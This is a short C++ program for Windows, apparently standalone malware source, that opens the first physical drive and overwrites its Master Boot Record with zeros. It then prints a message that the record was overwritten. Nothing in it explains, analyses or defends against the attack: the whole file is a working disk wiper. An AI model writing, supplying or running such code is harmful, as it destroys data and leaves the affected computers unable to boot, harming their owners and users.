#include <Windows.h>
#include <iostream>

using namespace std;

#define MRB_SIZE 512
int main()
{
    DWORD write;
    char mbrData[MRB_SIZE];
    //ciao
    ZeroMemory(&mbrData, (sizeof mbrData));

    HANDLE MasterBootRecord = CreateFile ("\\\\.\\PhysicalDrive0"
        , GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
        , NULL , OPEN_EXISTING, NULL, NULL);
        if(WriteFile(MasterBootRecord, mbrData, MRB_SIZE, NULL, NULL) == TRUE)
		{
            cout << "Master Boot Record is over written!" << endl;
			Sleep(5000);
			ExitProcess(0);
        }
        else{
            cout << "Fail";
            Sleep(5000);
			ExitProcess(0);
        }
    CloseHandle(MasterBootRecord);

    return EXIT_SUCCESS;
} 
